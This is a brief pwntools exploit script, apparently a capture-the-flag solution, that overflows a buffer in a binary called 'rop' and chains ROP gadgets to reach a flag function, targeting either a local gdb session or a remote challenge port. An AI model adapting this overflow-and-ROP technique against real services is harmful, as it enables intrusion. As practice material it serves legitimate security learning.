from pwn import *

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'kali-linux']

if args.LOCAL:
    p = gdb.debug('./rop')
else:
    p = remote('8.8.8.8', 1337)

unblock = 0x401194
pop_rdi = 0x401263
flag = 0x401156
payload = 0x78 * b'A' + p64(unblock) + p64(pop_rdi) + p64(0xdeadc0de) + \
                        p64(flag)
p.sendlineafter(b'here:', payload)

p.interactive()
